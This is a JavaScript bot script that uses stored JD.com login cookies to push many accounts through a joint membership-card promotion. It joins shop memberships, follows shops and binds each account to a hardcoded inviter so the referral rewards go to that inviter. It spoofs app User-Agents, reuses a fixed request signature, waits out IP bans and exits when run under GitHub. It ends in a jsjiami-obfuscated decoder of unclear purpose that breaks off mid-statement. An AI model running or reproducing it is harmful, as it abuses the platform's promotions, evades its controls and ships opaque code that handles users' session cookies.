/*
1.15～1.25 联合开卡
*/
let guaopencard_addSku = "false"
let guaopencard = "false"
let guaopenwait = "0"
let guaopencard_draw = "0"

const $ = new Env('1.15～1.25联合开卡');
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
const notify = $.isNode() ? require('./sendNotify') : '';
let cleanCart = ''
if($.isNode()){
    try{
        const fs = require('fs');
        if (fs.existsSync('./cleancart_activity.js')) {
            cleanCart = require('./cleancart_activity');
        }
    }catch(e){
    }
}
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [],
    cookie = '';
if ($.isNode()) {
    Object.keys(jdCookieNode).forEach((item) => {
        cookiesArr.push(jdCookieNode[item])
    })
    if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
} else {
    cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
}

guaopencard_addSku = true;
guaopencard_addSku = true;
guaopencard = true;
guaopencard = true;
guaopenwait = true;
guaopenwait = true;
guaopenwait = parseInt(guaopenwait, 10) || 0
//guaopencard_draw = true;
//guaopencard_draw = true;
allMessage = ""
message = ""
$.hotFlag = false
$.outFlag = false
$.activityEnd = false
let lz_jdpin_token_cookie =''
let activityCookie =''
!(async () => {
    if (!cookiesArr[0]) {
        $.msg($.name, '【提示】请先获取cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/', {
            "open-url": "https://bean.m.jd.com/"
        });
        return;
    }
    // return
    $.appkey = '51B59BB805903DA4CE513D29EC448375'
    $.userId = '10299171'
    $.actId = 'd32a6b5678c64ac2b_22011501'
    $.MixNicks = ''
    $.inviteNick = '/nFlfyWPdMnTxK1/nf0Ssc7TwJCmNe8NFvhpI0XmJDULVU108+UxlHw7qoUuHA4F'
    for (let i = 0; i < cookiesArr.length; i++) {
        cookie = cookiesArr[i];
        if (cookie) {
            $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
            $.index = i + 1;
            message = ""
            $.bean = 0
            $.hotFlag = false
            $.nickName = '';
            console.log(`\n\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
            await getUA()
            await run();
            if(i == 0 && !$.MixNick) break
            if($.outFlag || $.activityEnd) break
        }
    }
    if($.outFlag) {
        let msg = '此ip已被限制，请过10分钟后再执行脚本'
        $.msg($.name, ``, `${msg}`);
        if ($.isNode()) await notify.sendNotify(`${$.name}`, `${msg}`);
    }
})()
    .catch((e) => $.logErr(e))
    .finally(() => $.done())


async function run() {
    try {
        $.hasEnd = true
        $.endTime = 0
        lz_jdpin_token_cookie = ''
        $.Token = ''
        $.Pin = ''
        $.MixNick = ''
        let flag = false
        if($.activityEnd) return
        if($.outFlag){
            console.log('此ip已被限制，请过10分钟后再执行脚本\n')
            return
        }
        await takePostRequest('isvObfuscator');
        if($.Token == ''){
            console.log('获取[token]失败！')
            return
        }
        await takePostRequest('activity_load');
        if($.hotFlag) return
        if(Date.now() > $.endTime){
            $.MixNick = ''
            $.activityEnd = true
            console.log('活动结束')
            return
        }
        if ($.MixNick == '') {
            console.log(`获取cookie失败`); return;
        }
        // console.log($.MixNick)
        // return
        $.toBind = 0
        $.openList = []
        await takePostRequest('绑定');
        await takePostRequest('shopList');
        if($.activityEnd) return
        for(o of $.openList){
            $.missionType = 'openCard'
            if(o.open != true && o.openCardUrl){
                if($.activityEnd) return
                $.openCard = false
                $.joinVenderId = o.userId
                await takePostRequest('mission');
                await $.wait(parseInt(Math.random() * 3000 + 3000, 10))
                if($.openCard == true){
                    await joinShop()
                    await takePostRequest('activity_load');
                    await $.wait(parseInt(Math.random() * 3000 + 3000, 10))
                    // break
                }
                $.joinVenderId = ''
            }
        }
        $.joinVenderId = ''
        if($.hasCollectShop === 0){
            // 关注
            $.missionType = 'uniteCollectShop'
            await takePostRequest('mission');
            await $.wait(parseInt(Math.random() * 2000 + 3000, 10))
        }else{
            console.log('已经关注')
        }
        await takePostRequest('activity_load');
        await $.wait(parseInt(Math.random() * 1000 + 1000, 10))
        await takePostRequest('myAward');
        await $.wait(parseInt(Math.random() * 1000 + 1000, 10))
        await takePostRequest('missionInviteList');
        // console.log($.MixNick)
        // console.log(`当前助力:${$.inviteNick}`)
        // if($.index == 1){
        //     $.inviteNick = $.MixNick
        //     console.log(`后面的号都会助力:${$.inviteNick}`)
        // }
        await $.wait(parseInt(Math.random() * 1000 + 5000, 10))
        if(flag) await $.wait(parseInt(Math.random() * 1000 + 10000, 10))
        if(guaopenwait){
            if($.index != cookiesArr.length){
                console.log(`等待${guaopenwait}秒`)
                await $.wait(parseInt(guaopenwait, 10) * 1000)
            }
        }else{
            if($.index % 3 == 0) console.log('休息1分钟，别被黑ip了\n可持续发展')
            if($.index % 3 == 0) await $.wait(parseInt(Math.random() * 5000 + 60000, 10))
        }
    } catch (e) {
        console.log(e)
    }
}

async function takePostRequest(type) {
    if($.outFlag) return
    let domain = 'https://jinggengjcq-isv.isvjcloud.com';
    let body = ``;
    let method = 'POST'
    let admJson = ''
    switch (type) {
        case 'isvObfuscator':
            url = `https://api.m.jd.com/client.action?functionId=isvObfuscator`;
            body = `body=%7B%22url%22%3A%22https%3A//jinggengjcq-isv.isvjcloud.com/fronth5/%3Flng%3D0%26lat%3D0%26sid%3D49687cd64aca2ae93aa43748a04e8f6w%26un_area%3D16_1315_1316_53522%23/pages/unitedCardNew20211010-ka/unitedCardNew20211010-ka%3FactId%3D9150e1d16b9d40_10101%22%2C%22id%22%3A%22%22%7D&uuid=b9b4ce69d42dacb64084279d51cdee764d7781fa&client=apple&clientVersion=10.1.4&st=1634100732991&sv=111&sign=67e254ffbcb13be9e12a9782c9cdf398`;
            break;
        case 'activity_load':
            url = `${domain}/dm/front/openCardNew/activity_load?mix_nick=${$.MixNick || $.MixNicks || ""}`;
            admJson = {"jdToken": $.Token, "source": "01", "inviteNick":($.inviteNick || "")}
            if($.joinVenderId) admJson = {...admJson, "shopId": `${$.joinVenderId}`}
            body = taskPostUrl("/openCardNew/activity_load", admJson);
            break;
        case 'shopList':
            url = `${domain}/dm/front/openCardNew/shopList?mix_nick=${$.MixNick || $.MixNicks || ""}`;
            admJson = {}
            body = taskPostUrl("/openCardNew/shopList", admJson);
            break;
        case '绑定':
            url = `${domain}/dm/front/openCardNew/complete/mission?mix_nick=${$.MixNick || $.MixNicks || ""}`;
            admJson = {"missionType": "relationBind", "inviterNick":($.inviteNick || "")}
            body = taskPostUrl("/openCardNew/complete/mission", admJson);
            break;
        case 'mission':
            url = `${domain}/dm/front/openCardNew/complete/mission?mix_nick=${$.MixNick || $.MixNicks || ""}`;
            admJson = {"missionType": $.missionType}
            if($.joinVenderId) admJson = {...admJson, "shopId": $.joinVenderId}
            body = taskPostUrl("/openCardNew/complete/mission", admJson);
            break;
        case '抽奖':
            url = `${domain}/dm/front/openCardNew/draw/post?mix_nick=${$.MixNick || $.MixNicks || ""}`;
            admJson = {"dataType": "draw", "usedGameNum": "2"}
            body = taskPostUrl("/openCardNew/draw/post", admJson);
            break;
        case 'followShop':
            url = `${domain}/dm/front/openCardNew/followShop?mix_nick=${$.MixNick || $.MixNicks || ""}`;
            admJson = {"actId": $.actId, "missionType": "collectShop"}
            body = taskPostUrl("/openCardNew/followShop", admJson);
            break;
        case 'addCart':
            url = `${domain}/dm/front/openCardNew/addCart?mix_nick=${$.MixNick || $.MixNicks || ""}`;
            admJson = {"actId": $.actId, "missionType": "addCart"}
            body = taskPostUrl("/openCardNew/addCart", admJson);
            break;
        case 'myAward':
            url = `${domain}/dm/front/openCardNew/myAwards?mix_nick=${$.MixNick || $.MixNicks || ""}`;
            admJson = {"pageNo": 1,"pageSize":9999}
            body = taskPostUrl("/openCardNew/myAwards", admJson);
            break;
        case 'missionInviteList':
            url = `${domain}/dm/front/openCardNew/missionInviteList?mix_nick=${$.MixNick || $.MixNicks || ""}`;
            admJson = {"inviteListRequest":{"actId":$.actId,"userId":10299171,"missionType":"shareAct","inviteType": 1,"buyerNick":($.MixNick || '')}}
            body = taskPostUrl("/openCardNew/missionInviteList", admJson);
            break;
        default:
            console.log(`错误${type}`);
    }
    let myRequest = getPostRequest(url, body, method);
    return new Promise(async resolve => {
        $.post(myRequest, (err, resp, data) => {
            try {
                if (err) {
                    if(resp && resp.statusCode && resp.statusCode == 493){
                        console.log('此ip已被限制，请过10分钟后再执行脚本\n')
                        $.outFlag = true
                    }
                    console.log(`${$.toStr(err,err)}`)
                    console.log(`${type} API请求失败，请检查网路重试`)
                } else {
                    dealReturn(type, data);
                }
            } catch (e) {
                // console.log(data);
                console.log(e, resp)
            } finally {
                resolve();
            }
        })
    })
}

async function dealReturn(type, data) {
    let res = ''
    try {
        if(type != 'accessLogWithAD' || type != 'drawContent'){
            if(data){
                res = JSON.parse(data);
            }
        }
    } catch (e) {
        console.log(`${type} 执行任务异常`);
        console.log(data);
        $.runFalag = false;
    }
    try {
        let title = ''
        switch (type) {
            case 'isvObfuscator':
                if(typeof res == 'object'){
                    if(res.errcode == 0){
                        if(typeof res.token != 'undefined') $.Token = res.token
                    }else if(res.message){
                        console.log(`${type} ${res.message || ''}`)
                    }else{
                        console.log(data)
                    }
                }else{
                    console.log(data)
                }
                break;
            case 'accessLogWithAD':
            case 'drawContent':
                break;
            case 'activity_load':
            case 'mission':
            case 'shopList':
            case 'loadUniteOpenCard':
            case 'setMixNick':
            case 'uniteOpenCardOne':
            case 'checkOpenCard':
            case 'followShop':
            case 'addCart':
            case 'myAward':
            case 'missionInviteList':
            case '抽奖':
                title = ''
                if(type == "followShop") title = '关注'
                if(type == "addCart") title = '加购'
                if(typeof res == 'object'){
                    if(res.success && res.success === true && res.data){
                        if(res.data.status && res.data.status == 200){
                            res = res.data
                            if(type != "setMixNick" && (res.msg || res.data.isOpenCard || res.data.remark)) console.log(`${title && title+":" || ""}${res.msg || res.data.isOpenCard || res.data.remark || ''}`)
                            if(type == "activity_load"){
                                if(res.msg || res.data.isOpenCard) {
                                    if((res.msg || res.data.isOpenCard || '').indexOf('绑定成功') > -1) $.toBind = 1
                                }
                                if(res.data){
                                    $.endTime = res.data.cusActivity.endTime || 0
                                    $.MixNick = res.data.buyerNick || ""
                                    $.usedChance = res.data.missionCustomer.usedChance || 0
                                    $.hasCollectShop = res.data.missionCustomer.hasCollectShop || 0
                                }
                            }else if(type == "shopList"){
                                $.openList = res.data.cusShops || []
                            }else if(type == "mission"){
                                if(res.data.remark.indexOf('不是会员') > -1){
                                    $.openCard = true
                                }else{
                                    $.openCard = false
                                }
                            }else if(type == "uniteOpenCardOne"){
                                $.uniteOpenCar = res.msg || res.data.msg || ''
                            }else if(type == "myAward"){
                                console.log(`我的奖品：`)
                                let num = 0
                                let value = 0
                                for(let i in res.data.list || []){
                                    let item = res.data.list[i]
                                    if(item.awardDes == '20'){
                                        num++
                                        value = item.awardDes
                                    }else{
                                        console.log(`${item.awardName}`)
                                    }
                                }
                                if(num > 0) console.log(`邀请好友(${num}):${num*parseInt(value, 10) || 30}京豆`)
                            }else if(type == "missionInviteList"){
                                console.log(`邀请人数(${res.data.invitedLogList.total})`)
                            }
                        }else if(res.data.msg){
                            if(res.errorMessage.indexOf('活动未开始') >-1 ){
                                $.activityEnd = true
                            }
                            console.log(`${title || type} ${res.data.msg || ''}`)
                        }else if(res.errorMessage){
                            if(res.errorMessage.indexOf('火爆') >-1 ){
                                $.hotFlag = true
                            }
                            console.log(`${title || type} ${res.errorMessage || ''}`)
                        }else{
                            console.log(`${title || type} ${data}`)
                        }
                    }else if(res.errorMessage){
                        console.log(`${title || type} ${res.errorMessage || ''}`)
                    }else{
                        console.log(`${title || type} ${data}`)
                    }
                }else{
                    console.log(`${title || type} ${data}`)
                }
                break;
            default:
                console.log(`${title || type}-> ${data}`);
        }
        if(typeof res == 'object'){
            if(res.errorMessage){
                if(res.errorMessage.indexOf('火爆') >-1 ){
                    $.hotFlag = true
                }
            }
        }
    } catch (e) {
        console.log(e)
    }
}

function getPostRequest(url, body, method="POST") {
    let headers = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": cookie,
        "User-Agent": $.UA,
        "X-Requested-With": "XMLHttpRequest"
    }
    if(url.indexOf('https://jinggengjcq-isv.isvjcloud.com') > -1){
        headers["Origin"] = `https://jinggengjcq-isv.isvjcloud.com`
        headers["Content-Type"] = `application/json; charset=utf-8`
        delete headers["Cookie"]
    }
    // console.log(headers)
    // console.log(headers.Cookie)
    return  {url: url, method: method, headers: headers, body: body, timeout:60000};
}


function taskPostUrl(url, t) {

    const b = {
        "jsonRpc": "2.0",
        "params": {
            "commonParameter": {
                "appkey": $.appkey,
                "m": "POST",
                "timestamp": Date.now(),
                "userId": $.userId
            },
            "admJson": {
                "actId": $.actId,
                "userId": $.userId,
                ...t,
                "method": url,
                "buyerNick": ($.MixNick || ''),
            }
        },
    }
    if(url.indexOf('missionInviteList') > -1){
        delete b.params.admJson.actId
    }
    return $.toStr(b,b)
}
async function getUA(){
    $.UA = `jdapp;iPhone;10.1.4;13.1.2;${randomString(40)};network/wifi;model/iPhone8,1;addressid/2308460611;appBuild/167814;jdSupportDarkMode/0;Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1`
}
function randomString(e) {
    e = e || 32;
    let t = "abcdef0123456789", a = t.length, n = "";
    for (i = 0; i < e; i++)
        n += t.charAt(Math.floor(Math.random() * a));
    return n
}

function jsonParse(str) {
    if (typeof str == "string") {
        try {
            return JSON.parse(str);
        } catch (e) {
            console.log(e);
            $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
            return [];
        }
    }
}

function joinShop() {
    if(!$.joinVenderId) return
    return new Promise(async resolve => {
        $.shopactivityId = ''
        await $.wait(1000)
        await getshopactivityId()
        let activityId = ``
        if($.shopactivityId) activityId = `,"activityId":${$.shopactivityId}`
        const options = {
            url: `https://api.m.jd.com/client.action?appid=jd_shop_member&functionId=bindWithVender&body={"venderId":"${$.joinVenderId}","shopId":"${$.joinVenderId}","bindByVerifyCodeFlag":1,"registerExtend":{},"writeChildFlag":0${activityId},"channel":401}&client=H5&clientVersion=9.2.0&uuid=88888`,
            headers: {
                'Content-Type': 'text/plain; Charset=UTF-8',
                'Origin': 'https://api.m.jd.com',
                'Host': 'api.m.jd.com',
                'accept': '*/*',
                'User-Agent': $.UA,
                'content-type': 'application/x-www-form-urlencoded',
                'Cookie': cookie
            }
        }
        $.get(options, async (err, resp, data) => {
            try {
                // console.log(data)
                let res = $.toObj(data);
                if(typeof res == 'object'){
                    if(res.success === true){
                        console.log(res.message)
                        if(res.result && res.result.giftInfo){
                            for(let i of res.result.giftInfo.giftList){
                                console.log(`入会获得:${i.discountString}${i.prizeName}${i.secondLineDesc}`)
                            }
                        }
                    }else if(typeof res == 'object' && res.message){
                        console.log(`${res.message || ''}`)
                    }else{
                        console.log(data)
                    }
                }else{
                    console.log(data)
                }
            } catch (e) {
                $.logErr(e, resp)
            } finally {
                resolve();
            }
        })
    })
}
function getshopactivityId() {
    return new Promise(resolve => {
        const options = {
            url: `https://api.m.jd.com/client.action?appid=jd_shop_member&functionId=getShopOpenCardInfo&body=%7B%22venderId%22%3A%22${$.joinVenderId}%22%2C%22channel%22%3A401%7D&client=H5&clientVersion=9.2.0&uuid=88888`,
            headers: {
                'Content-Type': 'text/plain; Charset=UTF-8',
                'Origin': 'https://api.m.jd.com',
                'Host': 'api.m.jd.com',
                'accept': '*/*',
                'User-Agent': $.UA,
                'content-type': 'application/x-www-form-urlencoded',
                'Cookie': cookie
            }
        }
        $.get(options, async (err, resp, data) => {
            try {
                let res = $.toObj(data);
                if(res.success == true){
                    // console.log($.toStr(res.result))
                    console.log(`入会:${res.result.shopMemberCardInfo.venderCardName || ''}`)
                    $.shopactivityId = res.result.interestsRuleList && res.result.interestsRuleList[0] && res.result.interestsRuleList[0].interestsInfo && res.result.interestsRuleList[0].interestsInfo.activityId || ''
                }
            } catch (e) {
                $.logErr(e, resp)
            } finally {
                resolve();
            }
        })
    })
}

// prettier-ignore
function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}var _0xod8='jsjiami.com.v6',_0xod8_=['_0xod8'],_0x550c=[_0xod8,'VsKSwroiwrvDgQ==','w4VmXcK2AizCkCwU','GsOOwqXDscO3','w75lBcO6woMQ','w5tqw6XClhk=','XFB1','w5XCsDzCjBUFwpYyaMObCU7DgcKXd8KAw6HCiCzCrw==','SFTDkhpfwpTCml52N8KDwpzCosKfwrTCuiZ7w4o7OMK/DMKJZMOUwrTClF0=','wqTCimLDtsK2wqnChkcJBsOKwobCgMKGwo0IwrXDhMOLO3/Cp8OdO8Kzw7h4Zg==','w5rCocONwrvCsA==','wr7Ds8KTSyg=','bDTDgMKfwqE=','woHDtsKmQAI=','wpRRX8KDUMKxwqTCgcKT','w45ywq5cwro=','En5jwqI=','TUHDkgkN','f8Oywr9oNg==','w7hCHBce','w6jCq8OQwpvChA==','w4YebcOSw6Q=','BFtZwqfCuQ==','N8KrJcKPRcKNw43DhMOW','wqvCoDbDpCQ=','AjgLKusyDRjikami.hcozgmL.v6=='];if(function(_0x540623,_0x302027,_0x25f880){function _0xb68213(_0x2526a7,_0x3851dd,_0x3be2c5,_0x112554,_0x197950,_0x3c9d75){_0x3851dd=_0x3851dd>>0x8,_0x197950='po';var _0xc7bb01='shift',_0x29ead0='push',_0x3c9d75='0.q6r2um7zob8';if(_0x3851dd<_0x2526a7){while(--_0x2526a7){_0x112554=_0x540623[_0xc7bb01]();if(_0x3851dd===_0x2526a7&&_0x3c9d75==='0.q6r2um7zob8'&&_0x3c9d75['length']===0xd){_0x3851dd=_0x112554,_0x3be2c5=_0x540623[_0x197950+'p']();}else if(_0x3851dd&&_0x3be2c5['replace'](/[AgLKuyDRkhzgL=]/g,'')===_0x3851dd){_0x540623[_0x29ead0](_0x112554);}}_0x540623[_0x29ead0](_0x540623[_0xc7bb01]());}return 0xcaf3c;};return _0xb68213(++_0x302027,_0x25f880)>>_0x302027^_0x25f880;}(_0x550c,0x1e6,0x1e600),_0x550c){_0xod8_=_0x550c['length']^0x1e6;};function _0x56ae(_0x50afc8,_0x165767){_0x50afc8=~~'0x'['concat'](_0x50afc8['slice'](0x0));var _0x1938af=_0x550c[_0x50afc8];if(_0x56ae['xmTXzW']===undefined){(function(){var _0x5c909b;try{var _0x3781db=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x5c909b=_0x3781db();}catch(_0x3685d0){_0x5c909b=window;}var _0x394c06='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x5c909b['atob']||(_0x5c909b['atob']=function(_0x39184b){var _0x30fb93=String(_0x39184b)['replace'](/=+$/,'');for(var _0x5a412d=0x0,_0x29db91,_0x5d5a10,_0x8c7070=0x0,_0x1a53f7='';_0x5d5a10=_0x30fb93['charAt'](_0x8c7070++);~_0x5d5a10&&(_0x29db91=_0x5a412d%0x4?_0x29db91*0x40+_0x5d5a10:_0x5d5a10,_0x5a412d++%0x4)?_0x1a53f7+=String['fromCharCode'](0xff&_0x29db91>>(-0x2*_0x5a412d&0x6)):0x0){_0x5d5a10=_0x394c06['indexOf'](_0x5d5a10);}return _0x1a53f7;});}());function _0x26c1ac(_0x4531c0,_0x165767){var _0x660dac=[],_0x53ea26=0x0,_0x512474,_0x3e23c9='',_0x42f3d5='';_0x4531c0=atob(_0x4531c0);for(var _0x10d3db=0x0,_0x5c788f=_0x4531c0['length'];_0x10d3db<_0x5c788f;_0x10d3db++){_0x42f3d5+='%'+('00'+_0x4531c0['charCodeAt'](_0x10d3db)['toString'](0x10))['slice'](-0x2);}_0x4531c0=decodeURIComponent(_0x42f3d5);for(var _0x28cdaa=0x0;_0x28cdaa<0x100;_0x28cdaa++){_0x660dac[_0x28cdaa]=_0x28cdaa;}for(_0x28cdaa=0x0;_0x28cdaa<0x100;_0x28cdaa++){_0x53ea26=(_0x53ea26+_0x660dac[_0x28cdaa]+_0x165767['charCodeAt'](_0x28cdaa%_0x165767['length']))%0x100;_0x512474=_0x660dac[_0x28cdaa];_0x660dac[_0x28cdaa]=_0x660dac[_0x53ea26];_0x660dac[_0x53ea26]=_0x512474;}_0x28cdaa=0x0;_0x53ea26=0x0;for(var _0x8774d2=0x0;_0x8774d2<_0x4531c0['length'];_0x8774d2++){_0x28cdaa=(_0x28cdaa+0x1)%0x100;_0x53ea26=(_0x53ea26+_0x660dac[_0x28cdaa])%0x100;_0x512474=_0x660dac[_0x28cdaa];_0x660dac[_0x28cdaa]=_0x660dac[_0x53ea26];_0x660dac[_0x53ea26]=_0x512474;_0x3e23c9+=String['fromCharCode'](_0x4531c0['charCodeAt'](_0x8774d2)^_0x660dac[(_0x660dac[_0x28cdaa]+_0x660dac[_0x53ea26])%0x100]);}return _0x3e23c9;}_0x56ae['PzGKTz']=_0x26c1ac;_0x56ae['RSkGOa']={};_0x56ae['xmTXzW']=!![];}var 